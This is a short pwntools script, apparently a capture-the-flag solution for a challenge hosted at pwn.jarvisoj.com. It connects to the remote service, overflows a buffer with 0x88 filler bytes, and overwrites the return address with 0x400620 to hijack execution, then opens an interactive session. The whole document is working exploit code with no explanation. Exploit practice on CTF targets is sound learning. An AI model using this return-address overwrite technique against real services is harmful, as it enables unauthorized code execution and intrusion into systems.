from pwn import *
off=0x88
p=remote("pwn.jarvisoj.com",9876)
#p=process("challenge")
p.readuntil("message:")
payload=off*'\x01'+p64(0x000000000400620)
#gdb.attach(p)
p.send(payload)
p.interactive()
